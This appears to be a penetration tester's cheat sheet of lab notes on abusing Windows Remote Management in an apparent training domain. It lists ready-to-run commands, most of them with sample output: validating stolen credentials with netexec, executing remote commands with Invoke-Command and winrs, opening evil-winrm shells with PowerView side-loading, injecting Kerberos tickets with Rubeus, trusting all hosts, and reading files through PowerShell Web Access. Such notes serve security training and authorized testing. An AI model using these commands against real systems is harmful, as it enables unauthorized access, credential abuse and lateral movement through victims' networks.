# What is?
[Windows Remote Management (WinRM)](https://learn.microsoft.com/en-us/windows/win32/winrm/portal) is Microsoft's version of the [WS-Management (Web Services-Management) protocol](https://learn.microsoft.com/en-us/windows/win32/winrm/ws-management-protocol), a standard protocol for managing software and hardware remotely. WinRM facilitates the transfer of management data between computers, enabling administrators to perform a variety of tasks, such as running scripts and retrieving event data from remote systems.

WinRM is commonly used in conjunction with PowerShell for automation and administrative purposes, making it an indispensable tool for managing Windows environments. It provides a secure and efficient method to interact with remote systems, leveraging established web standards to ensure compatibility and flexibility. WinRM communication primarily utilizes TCP port `5985` for HTTP and `5986` for HTTPS.


## WinRM Rights
Identifying users with the rights to use WinRM involves checking group memberships, group policies, and testing credentials:
- `Remote Management Users Group`: Members of this group inherently have the permissions needed to use WinRM.
- `Group Policies`: Review group policies that might grant WinRM access to specific users.
- `Testing Credentials`: Test if various credentials can successfully connect via WinRM using different tools to verify their validity and access rights.
- `Active Directory (AD)`: We can use tools such as BloodHound or LDAP queries to find users with WinRM rights.


# How to enumerate?
```shell-session
netexec winrm 10.129.229.244 -u frewdy -p Kiosko093
WINRM       10.129.229.244  5985   SRV01            [*] Windows 10 / Server 2019 Build 17763 (name:SRV01) (domain:inlanefreight.local)
WINRM       10.129.229.244  5985   SRV01            [+] inlanefreight.local\frewdy:Kiosko093 (Pwn3d!)
```


# How to abuse(Windows FRIENDLY)
(You can execute commands remotely to another machine)
**Note:** If we use the IP instead of the computer name, we must use explicit credentials, or alternatively, we can use the flag `-Authentication Negotiate` instead of providing explicit credentials.
```powershell-session
Invoke-Command -ComputerName srv02 -ScriptBlock { hostname;whoami }

//OR
winrs -r:srv02 "powershell -c whoami;hostname"
```
(You can even ship them as another user from you current session)
```powershell-session
$username = "INLANEFREIGHT\Helen"
$password = "RedRiot88"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
Invoke-Command -ComputerName 172.20.0.52 -Credential $credential -ScriptBlock { whoami; hostname }

//OR
winrs -r:srv02 "powershell -c whoami;hostname"
```
(If you have access to Powershell you can get a interactive shell via Powertshell remoting)
```powershell-session
Enter-PSSession srv02.inlanefreight.local
```
**Note:** If we use the IP instead of the computer name, we must use explicit credentials, or alternatively, we can use the flag `-Authentication Negotiate` instead of providing explicit credentials.

(And also copy files via Powershell remoting)
```powershell-session
//Getting a validf sesison with the VICTIM
$sessionSRV02 = New-PSSession -ComputerName SRV02 -Credential $credential

//Copy the file to the VICTIM's session
Copy-Item -ToSession $sessionSRV02 -Path 'C:\Users\helen\Desktop\Sample.txt' -Destination 'C:\Users\helen\Desktop\Sample.txt' -Verbose
```


# How to abuse(Linux FRIENDLY)
(You can perform the same task directly from you KALI machine)
```shell-session
netexec winrm 10.129.229.244 -u frewdy -p Kiosko093 -x "ipconfig"
```
(Even get a fully semi-interactive shell)
```shell-session
evil-winrm -i 10.129.229.244 -u 'inlanefreight.local\frewdy' -p Kiosko093
```
(You can even side-load power-shell scripts by giving path to the folder containing your power-shell scripts)
```shell-session
//Tell the SW the script folder on you machine
 evil-winrm -i 10.129.229.244 -u 'inlanefreight.local\frewdy' -p Kiosko093 -s '/home/plaintext/'

//Callback the interested script
PowerView.ps1
menu
```


#  Extras
## Pass The Hash to WMI(Windows FRIENDLY)
```powershell-session
//Asking for a TGT
.\Rubeus.exe asktgt /user:leonvqz /rc4:32323DS033D176ABAAF6BEAA0AA681400 /nowrap

//Create a "sacrifical" process simulating "Netonly"
.\Rubeus.exe createnetonly /program:powershell.exe /show

//Inject into the "sacrifical" process
.\Rubeus.exe ptt /ticket:doIFsjCCBa6gAwIBBaEDAgEWooIEszCCBK9h...SNIP...

//PS-Remote with ticket into the "sacrifical" process
```powershell-session
Enter-PSSession SRV02.inlanefreight.local -Authentication Negotiate
[SRV02.inlanefreight.local]: PS C:\Users\Leonvqz\Documents> hostname
SRV02
```
## Troubleshooting PS-Remoting issues
If you are getting the following error.
```powershell-session
Enter-PSSession srv02
Enter-PSSession : Processing data from remote server srv02 failed with the following error message: WinRM cannot
process the request. The following error with errorcode 0x80090322 occurred while using Kerberos authentication: An
unknown security error occurred.
```
Then try to connect by using the FQDN of the host instead.
```powershell-session
Enter-PSSession srv02.inlanefreight.local
```

If you are getting this error with **"-Authentication Negotiate"** option
```powershell-session
Enter-PSSession srv02 -Authentication Negotiate
Enter-PSSession : Connecting to remote server srv02 failed with the following error message : The WinRM client cannot
process the request.  Default credentials with Negotiate over HTTP can be used only if the target machine is part of
the TrustedHosts list or the Allow implicit credentials for Negotiate option is specified. For more information, see
the about_Remote_Troubleshooting Help topic.
```
Then you can set the victim host as trusted for PS-Remoting.
```powershell-session
Set-Item WSMan:localhost\client\trustedhosts -value * -Force
```


# Windows PowerShell Web Access
Without getting too deep into it, basically it is a PS-Remoting accessible from the web browser, making it extremely easy to reach!
### How to identify?
It can be reached either on port HTTP or HTTPS and specifically on the web-path.
```
http://victim_ip/pswa
https://victim_ip/pswa
```
### Tips
Reading files can be slow due to to load due to the line-by-line transfer.  To bypass this use Base-64 conversion instead.
```powershell-session
//Convert B64 the file you want to read
[Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Windows\System32\drivers\etc\hosts"))

//Decode the result on you KALI
cat hosts_base64.txt | base64 -d > hosts
```
